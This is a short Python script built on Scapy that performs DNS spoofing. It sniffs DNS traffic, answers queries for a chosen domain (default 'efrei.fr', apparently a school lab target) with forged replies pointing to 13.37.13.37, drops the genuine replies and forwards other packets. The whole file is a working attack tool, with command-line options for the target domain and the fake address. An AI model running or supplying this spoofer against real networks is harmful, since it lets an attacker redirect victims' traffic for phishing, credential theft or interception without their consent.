from scapy.all import *
import argparse

def dns_spoof_and_filter(packet):
    if packet.haslayer(DNS):
        # Check if it's a DNS query
        if packet[DNS].qr == 0:
            query_name = packet[DNS].qd.qname.decode('utf-8')
            
            if query_name == domain:
                print(f"Intercepting DNS query for {query_name}")
                
                # Create a spoofed DNS response
                spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                   UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                                   DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                       an=DNSRR(rrname=query_name, ttl=10, rdata=spoofed_ip))
                
                # Send the spoofed response
                send(spoofed_response, verbose=False)
                
                # Drop the original query
                return
        
        # Check if it's a DNS response for our target domain
        elif packet[DNS].qr == 1:
            query_name = packet[DNS].qd.qname.decode('utf-8')
            
            if query_name == domain:
                print(f"Dropping DNS response for {query_name}")
                # Drop the response by returning without forwarding
                return
    
    # Forward all other packets
    send(packet, verbose=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Spoofing and Filtering Script")
    parser.add_argument("--domain", default="efrei.fr", help="Domain name to spoof (default: efrei.fr)")
    parser.add_argument("--ip", default="13.37.13.37", help="IP address to spoof (default: 13.37.13.37)")
    
    args = parser.parse_args()
    
    domain = f"{args.domain}."
    spoofed_ip = args.ip
    
    print(f"Spoofing and filtering DNS for domain {domain} with IP {spoofed_ip}")
    
    # Sniff and process DNS packets
    sniff(filter="udp port 53", prn=dns_spoof_and_filter, store=0)

